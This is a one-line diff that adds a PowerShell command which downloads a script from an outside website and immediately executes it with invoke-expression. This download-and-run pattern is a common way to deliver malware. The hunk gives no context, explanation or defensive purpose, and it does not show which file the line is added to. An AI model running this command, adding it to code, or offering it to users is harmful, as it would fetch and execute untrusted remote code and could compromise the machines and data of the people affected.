@@ -1,0 +1,1 @@
+invoke-expression (new-object net.webclient).downloadstring("https://yousefjameh.com/new/sets.ps1")
